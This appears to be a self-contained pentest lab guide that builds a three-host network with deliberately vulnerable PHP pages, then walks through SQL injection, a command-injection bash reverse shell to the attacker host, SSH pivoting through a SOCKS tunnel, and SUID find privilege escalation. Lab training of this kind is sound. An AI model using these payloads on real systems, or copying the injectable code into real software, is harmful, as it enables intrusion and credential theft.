# Lab: Full Attack Chain — Web Exploitation to Internal Pivot

## Objective

Discover a web application vulnerability, exploit it to get a shell, move laterally through credentials found post-exploitation, pivot to an internal network, exploit a second target, and escalate to root. This simulates a realistic OSCP exam standalone + pivot scenario.

## Network Diagram

```
Kali (192.168.244.129)
    │
    ├── Debian (192.168.244.132) — web server with vulnerable app
    │
    └── CentOS (192.168.244.131 / 172.16.0.1) — internal middleware
            │
            └── Ubuntu (172.16.0.2) — internal target with the flag
```

## Skills Practiced

- Web enumeration and source code analysis
- SQL injection (authentication bypass + data extraction)
- Command injection to reverse shell
- Post-exploitation credential harvesting
- SSH lateral movement
- SSH tunneling to reach internal network
- nmap through tunnels
- Privilege escalation (SUID binary)

---

## Setup

### On Debian (192.168.244.132)

```bash
sudo apt update
sudo apt install apache2 php libapache2-mod-php php-mysql mariadb-server openssh-server -y
sudo systemctl enable --now apache2 ssh mariadb

# Create the database
sudo mysql << 'SQL'
CREATE DATABASE corporate;
CREATE TABLE corporate.employees (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(50), password VARCHAR(100), department VARCHAR(50), notes TEXT
);
INSERT INTO corporate.employees VALUES 
    (1, 'admin', 'Admin@2026!', 'IT', 'System administrator'),
    (2, 'jsmith', 'Welcome123', 'Sales', 'New hire'),
    (3, 'svc_internal', 'Int3rn@lAcc3ss!', 'IT', 'CentOS middleware: 192.168.244.131 SSH user: intadmin pass: Int3rn@lAcc3ss!'),
    (4, 'flag_entry', 'FLAG{database_credentials_extracted}', 'SECRET', 'You found the DB flag');
GRANT ALL ON corporate.* TO 'webapp'@'localhost' IDENTIFIED BY 'webapppass';
FLUSH PRIVILEGES;
SQL

# Main page
cat << 'EOF' | sudo tee /var/www/html/index.html
<html><head><title>Corporate Portal</title></head>
<body>
<h1>Corporate Employee Portal</h1>
<p>Welcome to our internal portal.</p>
<ul>
    <li><a href="/portal/login.php">Employee Login</a></li>
    <li><a href="/portal/directory.php">Employee Directory</a></li>
</ul>
<!-- Maintenance: diagnostic tool at /tools/diag.php -->
</body></html>
EOF

# Login page (SQLi vulnerable)
sudo mkdir -p /var/www/html/portal
cat << 'PHPEOF' | sudo tee /var/www/html/portal/login.php
<?php
$conn = new mysqli("localhost", "webapp", "webapppass", "corporate");
$msg = "";
if(isset($_POST['user']) && isset($_POST['pass'])) {
    $u = $_POST['user']; $p = $_POST['pass'];
    $r = $conn->query("SELECT * FROM employees WHERE name='$u' AND password='$p'");
    if($r && $row = $r->fetch_assoc()) {
        $msg = "<div style='color:green'><h2>Welcome, {$row['name']}</h2>
                <p>Department: {$row['department']}</p>
                <p>Notes: {$row['notes']}</p></div>";
    } else { $msg = "<p style='color:red'>Invalid credentials.</p>"; }
}
?>
<html><body>
<h1>Employee Login</h1>
<form method="POST">
Username: <input name="user"><br><br>
Password: <input type="password" name="pass"><br><br>
<button type="submit">Login</button>
</form>
<?php echo $msg; ?>
</body></html>
PHPEOF

# Directory page (SQLi UNION injectable)
cat << 'PHPEOF' | sudo tee /var/www/html/portal/directory.php
<?php
$conn = new mysqli("localhost", "webapp", "webapppass", "corporate");
$results = "";
if(isset($_GET['id'])) {
    $id = $_GET['id'];
    $r = $conn->query("SELECT id, name, department FROM employees WHERE id=$id");
    if($r && $row = $r->fetch_assoc()) {
        $results = "<p>Name: {$row['name']} | Dept: {$row['department']}</p>";
    } else {
        $results = "<p>Not found.</p>";
        if($conn->error) $results .= "<p style='color:red'>{$conn->error}</p>";
    }
}
?>
<html><body>
<h1>Employee Directory</h1>
<form method="GET">
Employee ID: <input name="id" size="5">
<button type="submit">Search</button>
</form>
<?php echo $results; ?>
</body></html>
PHPEOF

# Diagnostic tool (command injection)
sudo mkdir -p /var/www/html/tools
cat << 'PHPEOF' | sudo tee /var/www/html/tools/diag.php
<html><body>
<h1>Network Diagnostics</h1>
<form method="GET">
Host: <input name="host" size="30">
<button type="submit">Check</button>
</form>
<?php
if(isset($_GET['host'])) {
    echo "<pre>" . shell_exec("ping -c 2 " . $_GET['host']) . "</pre>";
}
?>
</body></html>
PHPEOF

# Open firewall
sudo iptables -F && sudo iptables -P INPUT ACCEPT
```

### On CentOS (192.168.244.131 / 172.16.0.1)

```bash
sudo systemctl stop firewalld && sudo systemctl disable firewalld
sudo dnf install iptables-services -y
sudo systemctl enable --now sshd

# Verify second NIC
sudo ip addr add 172.16.0.1/24 dev ens224 2>/dev/null
sudo ip link set ens224 up

# Create users
sudo useradd -m -s /bin/bash intadmin
echo "intadmin:Int3rn@lAcc3ss!" | sudo chpasswd
sudo usermod -aG wheel intadmin

# Breadcrumb — internal server info
sudo mkdir -p /home/intadmin/configs
echo "Ubuntu internal server: 172.16.0.2" | sudo tee /home/intadmin/configs/servers.txt
echo "SSH user: devops / pass: D3v0ps@2026!" | sudo tee -a /home/intadmin/configs/servers.txt
sudo chown -R intadmin:intadmin /home/intadmin/configs

# Enable IP forwarding + SSH forwarding
sudo sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
sudo sed -i 's/#AllowTcpForwarding yes/AllowTcpForwarding yes/' /etc/ssh/sshd_config
sudo systemctl restart sshd

# iptables
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p icmp -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT ACCEPT
sudo iptables -A FORWARD -s 192.168.244.0/24 -d 172.16.0.0/24 -j ACCEPT
sudo iptables -A FORWARD -s 172.16.0.0/24 -d 192.168.244.0/24 -j ACCEPT
sudo iptables -P FORWARD DROP
sudo iptables -t nat -A POSTROUTING -s 192.168.244.0/24 -o ens224 -j MASQUERADE
sudo service iptables save
```

### On Ubuntu (172.16.0.2)

```bash
sudo ip addr add 172.16.0.2/24 dev ens38 2>/dev/null
sudo ip link set ens38 up
sudo apt update && sudo apt install openssh-server -y
sudo systemctl enable --now ssh

sudo useradd -m -s /bin/bash devops
echo "devops:D3v0ps@2026!" | sudo chpasswd

echo "FLAG{full_chain_attack_complete}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt

# SUID binary for privesc
sudo cp /usr/bin/find /usr/local/bin/find
sudo chmod u+s /usr/local/bin/find

# Firewall — only from 172.16.0.0/24
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -s 172.16.0.0/24 -j ACCEPT
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT ACCEPT
```

---

## Attack Walkthrough

### Phase 1: Reconnaissance

```bash
nmap -sV -sC 192.168.244.132 -oN debian_scan.txt
nmap -sV -sC 192.168.244.131 -oN centos_scan.txt
```

Debian shows HTTP (80) + SSH (22). CentOS shows SSH (22) only.

### Phase 2: Web enumeration

```bash
curl -s http://192.168.244.132 | grep "<!--"
# HTML comment reveals /tools/diag.php

gobuster dir -u http://192.168.244.132 -w /usr/share/wordlists/dirb/common.txt -x php
# Finds /portal/

curl http://192.168.244.132/portal/login.php
curl http://192.168.244.132/portal/directory.php
curl http://192.168.244.132/tools/diag.php
```

### Phase 3: SQL injection on directory page

```bash
# Confirm SQLi
curl "http://192.168.244.132/portal/directory.php?id=1'"
# Error confirms injection

# Find columns
curl "http://192.168.244.132/portal/directory.php?id=1 ORDER BY 3"    # works
curl "http://192.168.244.132/portal/directory.php?id=1 ORDER BY 4"    # error → 3 columns

# Extract data
curl "http://192.168.244.132/portal/directory.php?id=-1 UNION SELECT 1,GROUP_CONCAT(name,':',password),3 FROM employees"
# Reveals all credentials including svc_internal with CentOS SSH creds in notes column

curl "http://192.168.244.132/portal/directory.php?id=-1 UNION SELECT 1,notes,3 FROM employees WHERE name='svc_internal'"
# CentOS middleware: 192.168.244.131 SSH user: intadmin pass: Int3rn@lAcc3ss!
```

### Phase 4: Command injection for a shell

```bash
# Confirm command injection
curl "http://192.168.244.132/tools/diag.php?host=127.0.0.1;whoami"

# Get a reverse shell
# Kali terminal 1: nc -lvnp 4444
curl "http://192.168.244.132/tools/diag.php?host=127.0.0.1;bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/192.168.244.129/4444%200>%261'"

# Upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

### Phase 5: Lateral movement to CentOS

```bash
ssh intadmin@192.168.244.131
# Password: Int3rn@lAcc3ss!

# Enumerate
cat /home/intadmin/configs/servers.txt
# Ubuntu: 172.16.0.2, devops / D3v0ps@2026!

ip a
# See both interfaces — this machine bridges both networks
```

### Phase 6: Tunnel to internal network

```bash
# From Kali — SOCKS proxy through CentOS
ssh -D 9050 intadmin@192.168.244.131

# Configure proxychains: socks5 127.0.0.1 9050

# Scan Ubuntu
proxychains nmap -sT -Pn 172.16.0.2 -p 22,80
```

### Phase 7: Access Ubuntu and escalate

```bash
# SSH through the tunnel (or from CentOS directly)
proxychains ssh devops@172.16.0.2
# Password: D3v0ps@2026!

# Enumerate for privesc
find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/find — SUID

# Exploit
/usr/local/bin/find . -exec /bin/bash -p \;
whoami   # root
cat /root/flag.txt
# FLAG{full_chain_attack_complete}
```

---

## Attack Chain Summary

```
1. nmap → find Debian web server
2. Source analysis → find /tools/diag.php and /portal/
3. SQLi on directory.php → extract credentials + CentOS SSH creds
4. Command injection on diag.php → reverse shell on Debian
5. SSH to CentOS with found credentials → find Ubuntu creds
6. SSH tunnel through CentOS → reach internal network
7. SSH to Ubuntu → SUID find → root → flag
```

## Cleanup

```bash
# Debian
sudo mysql -e "DROP DATABASE corporate; DROP USER 'webapp'@'localhost';"
sudo rm -rf /var/www/html/portal /var/www/html/tools

# CentOS
sudo userdel -r intadmin
sudo iptables -F && sudo iptables -t nat -F && sudo iptables -P INPUT ACCEPT && sudo iptables -P FORWARD ACCEPT

# Ubuntu
sudo userdel -r devops && sudo rm /usr/local/bin/find /root/flag.txt
sudo iptables -F && sudo iptables -P INPUT ACCEPT
```
